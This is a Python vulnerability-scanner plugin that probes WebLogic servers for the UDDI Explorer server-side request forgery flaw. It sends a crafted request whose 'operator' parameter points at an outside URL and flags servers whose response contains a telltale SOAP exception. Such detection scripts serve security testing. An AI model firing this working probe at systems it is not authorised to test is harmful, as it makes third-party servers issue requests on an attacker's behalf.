#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEBLOGIC

    async def prove(self):
        if self.base_url:
            url = self.base_url + 'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.baidu.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
            async with ClientSession() as session:
                async with session.get(url=url) as res:
                    if res:
                        text = await res.text()
                        if "weblogic.uddi.client.structures.exception.XML_SoapException" in text :
                            yield url

